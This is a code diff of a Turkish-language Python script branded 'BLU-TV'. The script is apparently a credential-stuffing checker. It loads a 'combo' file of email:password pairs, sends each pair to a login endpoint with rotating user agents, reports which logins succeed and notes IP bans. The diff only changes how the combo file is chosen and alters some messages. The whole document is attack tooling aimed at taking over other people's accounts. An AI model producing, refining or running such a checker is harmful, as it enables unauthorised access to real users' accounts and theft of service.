@@ -3,7 +3,6 @@ import random
 import os
 import json
 from cfonts import render
-from tkinter import Tk, filedialog
 
 # Renk kodları
 KIRMIZI = '\033[1;31m'
@@ -15,14 +14,12 @@ SIFIRLA = '\033[0m'
 zenit = render('BLU-TV', colors=['white', 'blue'], align='center')
 print(zenit)
 
-# Dosya seçimi için tkinter kullanımı
-root = Tk()
-root.withdraw()  # Tk penceresini gizle
-dosya_yolu = filedialog.askopenfilename(title="Bir dosya seçin", filetypes=[("Text files", "*.txt")])
+# Kullanıcıdan dosya ismini alma
+dosya_ismi = input("Lütfen dosya ismini girin: ")
 
-# Seçilen dosya yolu boşsa işlemden çık
-if not dosya_yolu:
-    print(f"{KIRMIZI}Dosya seçilmedi, işlem iptal edildi.{SIFIRLA}")
+# Dosya yolunun doğruluğunu kontrol et
+if not os.path.isfile(dosya_ismi):
+    print(f"{KIRMIZI} Dosya bulunamadı, işlem iptal edildi.{SIFIRLA}")
     exit()
 
 os.system('cls' if os.name == 'nt' else 'clear')
@@ -41,10 +38,10 @@ user_agents = [
 ]
 
 try:
-    with open(dosya_yolu, "r", encoding="utf-8") as dosya:
+    with open(dosya_ismi, "r", encoding="utf-8") as dosya:
         hesaplar = [satir.strip() for satir in dosya if satir.strip() and ":" in satir]
 except FileNotFoundError:
-    print(f"{KIRMIZI} COMBO BULUNAMADİ KNK {SIFIRLA}")
+    print(f"{KIRMIZI} DOSYA BULUNAMADI, LÜTFEN DOĞRU BİR DOSYA GİRİNİZ. {SIFIRLA}")
     exit()
 except UnicodeDecodeError:
     print(f"{KIRMIZI} Dosya kodlaması hatası, 'utf-8' ile okunamadı. Lütfen dosyanın kodlamasını kontrol edin. {SIFIRLA}")
@@ -82,8 +79,6 @@ for hesap in hesaplar:
     try:
         response = requests.post(url, data=data, headers=headers)
         sonuc = response.text
-        print("")
-        print(f"{SIFIRLA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
         if '"status":"ok"' in sonuc:
             print(f"{YESIL}✅ Başarılı giriş: {email}:{password}{SIFIRLA}")
@@ -93,4 +88,3 @@ for hesap in hesaplar:
             print(f"{KIRMIZI}⛔ Başarısız giriş: {email}:{password}{SIFIRLA}")
     except Exception as e:
         print(f"{KIRMIZI}⛔ İP BAN VEYA İNTERNET YOK : {str(e)}{SIFIRLA}")
-        
